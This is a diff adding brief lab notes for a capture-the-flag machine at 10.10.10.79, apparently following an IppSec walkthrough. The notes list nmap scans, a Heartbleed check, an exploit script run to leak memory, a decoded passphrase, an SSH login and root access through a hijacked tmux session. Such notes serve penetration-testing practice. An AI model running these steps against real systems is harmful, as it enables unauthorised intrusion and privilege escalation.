@@ -1,0 +1,10 @@
+//based on IppSec
+nmap -sC -sV -v -oN nmap_valentine 10.10.10.79
+nmap -p 443 --script ssl-heartbleed 10.10.10.79
+for i in {1..3}; do python 32764.py -p 443 10.10.10.79; done
+aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
+heartbleedbelievethehype
+ssh -i key hype@10.10.10.79	//got user
+
+cat .bash_history
+tmux -S /.devs/dev_sess		//got root
